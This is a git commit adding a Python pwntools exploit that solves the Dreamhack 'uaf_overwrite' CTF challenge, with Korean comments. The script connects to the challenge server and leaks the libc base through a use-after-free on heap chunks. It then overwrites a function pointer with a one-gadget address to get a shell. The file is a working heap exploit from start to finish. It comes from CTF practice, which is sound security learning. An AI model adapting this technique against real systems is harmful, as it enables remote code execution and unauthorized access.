d7bff17d19992343c14991f28021d1e9d01e4445
Juhyeong Kim <kesnt8892@gmail.com>
2024-08-21 21:22:21 +0000

    uaf_overwrite solved

---
+++ solved/uaf_overwrite/ex.py
@@ -0,0 +1,59 @@
+#!/usr/bin/env python3
+# Name: uaf_overwrite.py
+from pwn import *
+
+p = remote("host3.dreamhack.games", 18315)
+
+
+def human(weight, age):
+    p.sendlineafter(b'>', b'1')
+    p.sendlineafter(b': ', str(weight).encode())
+    p.sendlineafter(b': ', str(age).encode())
+
+    # p.sendline(str(weight).encode())
+    # p.sendline(str(age).encode())
+
+
+def robot(weight):
+    p.sendlineafter(b'>', b'2')
+    p.sendlineafter(b': ', str(weight).encode())
+
+    # p.sendline(b'2')
+    # p.sendline(str(weight).encode())
+
+
+def custom(size, data, idx):
+    p.sendlineafter(b'>', b'3')
+    p.sendlineafter(b': ', str(size).encode())
+    # 여긴 `scanf`가 아닌 `read`로 입력 받기 때문에 `send`로 보내야 함
+    # 만약 `sendline`으로 보내면 data에 `\n`이 추가되서 출력되는 `data` 값이 달라져서 offset도 달라짐
+    p.sendafter(b': ', data)
+    p.sendlineafter(b': ', str(idx).encode())
+
+    # p.sendline(b'3')
+    # p.sendline(str(size).encode())
+    # p.send(p64(data))
+    # p.sendline(str(idx).encode())
+
+
+# [1] Leak libc base
+custom(0x500, b'random1', -1)  # 사이즈를 8바이트 단위로 `0x4f9 ~ 0x508` 까지는 같은 오프셋을 가리킴
+custom(0x500, b'random2', 0)
+custom(0x500, b'B', -1)
+# data 값이 'B'가 아니라 'C'가 된다면, 아스키코드 기준 1이 커진 값이 입력되므로, offset은 0x3ebc42 가 아니라 0x3ebc43가 되야한다.
+# 반대로 'A'라면, 0x3ebc41이어야 한다.
+
+# custom(0x500, b'a'*0x8, -1)
+# p.recvuntil(b'a'*0x8)
+
+libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc42
+og = libc_base + 0x10a41c  # 제약 조건을 만족하는 원가젯
+# og = libc_base + 0x4f3ce
+# og = libc_base + 0x4f3d5
+# og = libc_base + 0x4f432
+
+# [2] `robot->fptr` Overwrite
+human(1, og)
+robot(1)
+
+p.interactive()
